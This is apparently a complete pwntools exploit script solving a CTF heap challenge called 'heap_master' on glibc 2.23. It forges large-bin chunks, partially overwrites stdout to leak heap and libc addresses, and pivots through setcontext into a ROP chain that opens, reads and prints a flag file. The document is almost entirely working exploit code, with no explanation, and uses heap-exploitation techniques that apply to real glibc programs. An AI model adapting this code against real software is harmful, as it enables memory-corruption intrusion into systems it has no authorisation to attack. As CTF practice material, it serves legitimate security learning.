from pwn import *

elf = ELF('./heap_master')
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'

def add(size):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('size: ', str(size))

def edit(off,cont):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('offset: ', str(off))
    p.sendlineafter('size: ', str(len(cont)))
    p.sendafter('content: ', cont)

def delete(off):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('offset: ', str(off))

def exp():
    edit(0x108,p64(0x401))      #fake first large chunk
    edit(0x508,p64(0x21))
    edit(0x528,p64(0x21))
    delete(0x110)
    add(0x400)

    edit(0x608,p64(0x411))
    edit(0x608+0x410,p64(0x21))
    edit(0x608+0x430,p64(0x21))
    delete(0x610)
    edit(0x118,p16(0x2610))     #modify stdout_flag --> mmap_addr
    add(0x410)

    edit(0x1008,p64(0x451))     #fake second large chunk
    edit(0x1458,p64(0x21))
    edit(0x1478,p64(0x21))
    delete(0x1010)
    add(0x450)

    edit(0x1508,p64(0x461))
    edit(0x1968,p64(0x21))
    edit(0x1988,p64(0x21))
    delete(0x1510)
    edit(0x1018,p16(0x2629))    #modify io_write_base_one_byte --> '\x00'
    add(0x460)

    data = p.recv(8,timeout=1)
    if data == '' or data[0] == '=' :
        raise NameError
    else :
        pass
    p.recv(24)
    data1 = u64(p.recv(8))
    data2 = u64(p.recv(6).ljust(8,'\x00'))
    heap_base = data1 - 3584
    libc_base = data2 - 3954339
    setcontext = libc_base + 293749
    print hex(heap_base),hex(libc_base)

    edit(0x2008,p64(0x501))
    edit(0x2508,p64(0x21))
    edit(0x2528,p64(0x21))
    delete(0x2010)
    add(0x500)

    edit(0x2608,p64(0x511))
    edit(0x2b18,p64(0x21))
    edit(0x2b38,p64(0x21))
    delete(0x2610)
    edit(0x2018,p16(0x62d0))
    add(0x510)

    #gdb.attach(p)
    pop_rax = libc_base + 0x0000000000033544
    pop_rdi = libc_base + 0x0000000000021102
    pop_rsi = libc_base + 0x00000000000202e8
    pop_rdx = libc_base + 0x0000000000001b92
    syscall = libc_base + 0x00000000000bc375
    edit(0x2600,p64(libc_base+0x6D98A))
    edit(0x2620,p64(setcontext))
    edit(0x26a0,p64(heap_base+0x26b0))
    edit(0x26a8,p64(libc_base+0x0000000000000937)) #ret

    edit(0x26b0,p64(pop_rax))    #read
    edit(0x26b8,p64(0))
    edit(0x26c0,p64(pop_rdi))
    edit(0x26c8,p64(0))
    edit(0x26d0,p64(pop_rsi))
    edit(0x26d8,p64(heap_base))
    edit(0x26e0,p64(pop_rdx))
    edit(0x26e8,p64(20))
    edit(0x26f0,p64(syscall))

    edit(0x26f8,p64(pop_rax))    #open
    edit(0x2700,p64(2))
    edit(0x2708,p64(pop_rdi))
    edit(0x2710,p64(heap_base))
    edit(0x2718,p64(pop_rsi))
    edit(0x2720,p64(0))
    edit(0x2728,p64(pop_rdx))
    edit(0x2730,p64(0))
    edit(0x2738,p64(syscall))

    edit(0x2740,p64(pop_rax))    #read
    edit(0x2748,p64(0))
    edit(0x2750,p64(pop_rdi))
    edit(0x2758,p64(4))
    edit(0x2760,p64(pop_rsi))
    edit(0x2768,p64(heap_base))
    edit(0x2770,p64(pop_rdx))
    edit(0x2778,p64(0x20))
    edit(0x2780,p64(syscall))

    edit(0x2788,p64(pop_rax))    #write
    edit(0x2790,p64(1))
    edit(0x2798,p64(pop_rdi))
    edit(0x27a0,p64(1))
    edit(0x27a8,p64(pop_rsi))
    edit(0x27b0,p64(heap_base))
    edit(0x27b8,p64(pop_rdx))
    edit(0x27c0,p64(0x20))
    edit(0x27c8,p64(syscall))

    delete(0x2b20)
    delete(0x2b20)

    p.send('./flag\x00')

    p.interactive()

if __name__ == '__main__' :
    pd = 1
    while pd:
        try :
            p = process('./heap_master')
            exp()
            pd = 0
        except Exception as e:
            print e
            p.close()
        pass
